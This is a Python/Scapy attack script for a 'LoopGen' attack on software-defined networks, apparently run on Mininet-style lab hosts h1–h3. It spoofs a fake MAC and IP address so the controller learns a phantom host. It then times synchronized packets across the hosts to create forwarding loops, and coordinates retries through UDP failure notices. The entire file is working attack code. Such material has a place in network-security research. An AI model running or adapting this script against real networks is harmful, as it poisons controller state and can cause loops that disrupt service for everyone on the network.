#!/usr/bin/env python3
"""
LoopGen synchronized attack (threaded version)
- Each host (h1, h2, h3) runs two threads:
  1. Listener thread: listens for failure notifications (starts first)
  2. Attack thread: performs synchronized LoopGen attacks
- Failure notification is sent as **unicast** to other two hosts.
- When a host receives a fail notice, it does NOT rebroadcast.
"""

from scapy.all import *
from datetime import datetime
import time, socket, threading, json

# ======== CONFIGURATION ========
ROLE = "h1"      # change to "h2" / "h3" for other hosts
IFACE = f"{ROLE}-eth0"
PORT = 9999
FAKE_MAC = "00:00:00:00:00:08"
FAKE_IP = "10.0.0.8"

# real source/target pairs
HOST_MAP = {
    "h1": ("00:00:00:00:00:01", "10.0.0.1", "00:00:00:00:00:02", "10.0.0.2"),
    "h2": ("00:00:00:00:00:02", "10.0.0.2", "00:00:00:00:00:03", "10.0.0.3"),
    "h3": ("00:00:00:00:00:03", "10.0.0.3", "00:00:00:00:00:01", "10.0.0.1"),
}

PEER_IPS = {"h1": ["10.0.0.2", "10.0.0.3"],
             "h2": ["10.0.0.1", "10.0.0.3"],
             "h3": ["10.0.0.1", "10.0.0.2"]}

SRC_MAC, SRC_IP, DST_MAC, DST_IP = HOST_MAP[ROLE]
MY_PEERS = PEER_IPS[ROLE]

# shared flag between threads
shared_flag = {"stop": False, "fail": False, "round": 0}


# ======== UDP COMMUNICATION ========
def send_fail_notice():

    pkt_probe = Ether(src=SRC_MAC, dst="00:00:00:00:00:02") / IP(src=SRC_IP, dst="10.0.0.2") / UDP(dport=9999)
    sendp(pkt_probe, iface=IFACE, verbose=False)

    pkt_probe = Ether(src=SRC_MAC, dst="00:00:00:00:00:03") / IP(src=SRC_IP, dst="10.0.0.3") / UDP(dport=9999)
    sendp(pkt_probe, iface=IFACE, verbose=False)

def packet_callback(packet):
    global shared_flag
    shared_flag["fail"] = True
    ip_dst = packet[IP].dst
    udp_dport = packet[UDP].dport
    if ip_dst == FAKE_IP and udp_dport == 9998:
        send_fail_notice()
        print(f"received dst=10.0.0.8 on this host")
    elif ip_dst == SRC_IP and udp_dport == 9999:
        print(f"failed message from {packet[IP].src}")



def listener_thread():
    bpf_filter = (
        f"inbound and udp and ( "
        f"(dst host {FAKE_IP} and dst port 9998) "
        f"or "
        f"(dst host {SRC_IP} and dst port 9999) "
        f")"
    )
    print("sniff thread")

    packets = sniff(iface=IFACE, filter=bpf_filter, prn=packet_callback)


def get_target_timestamp():

    now = datetime.now()
    current_second = now.second
    microsecond = now.microsecond / 1_000_000

    remainder = current_second % 15
    time_to_next_15s = 15 - remainder - microsecond

    wait_seconds = time_to_next_15s + 15 if time_to_next_15s <= 10 else time_to_next_15s
    target_time = now + timedelta(seconds=wait_seconds)
    target_time = target_time.replace(microsecond=0)

    return target_time.timestamp()

# ======== ATTACK LOGIC ========
def attack_thread():
    """Main LoopGen attack logic with synchronization."""
    print(f"[{ROLE}] Attack thread started (iface={IFACE})")

    while True:
        # synchronization barrier: wait if fail notice received
        global shared_flag
        shared_flag["fail"] = False
        shared_flag["round"] += 1

        # schedule attack start time (next minute + 30s)
        target_time = get_target_timestamp()
        # wait silently until that moment

        pkt_probe = Ether(src=FAKE_MAC, dst=DST_MAC) / IP(src=FAKE_IP, dst=DST_IP) / UDP(dport=9997) / b"SYNC_PKT"
        print("sendpacket thread")
        while True:
            diff = target_time - time.time()
            if diff <= 0:
                break
            time.sleep(0.5 if diff > 1 else diff)

        # ===== Phase 1: probe fake host =====
        sendp(pkt_probe, iface=IFACE, verbose=False)

        # allow controller to learn
        time.sleep(3.0)

        # ===== Phase 2: synchronized attack =====
        pkt_attack = Ether(src=SRC_MAC, dst=FAKE_MAC) / IP(src=SRC_IP, dst=FAKE_IP) / UDP(dport=9998) / b"LOOPGEN_ATTACK"
        sendp(pkt_attack, iface=IFACE, verbose=False)

        # sniff for loopback packets (5s window)

        time.sleep(5)

        if shared_flag["fail"] == True:
            print("fail")
            continue
        else:
            round_num = shared_flag["round"]
            print(f"[{ROLE}] ✅ Attack succeeded in round {round_num}")
            break

    print(f"[{ROLE}] Attack finished.")


# ======== MAIN ENTRY ========
def main():
    listener = threading.Thread(target=listener_thread, daemon=True)
    listener.start()

    attack = threading.Thread(target=attack_thread, daemon=True)
    attack.start()
    attack.join()


if __name__ == "__main__":
    main()
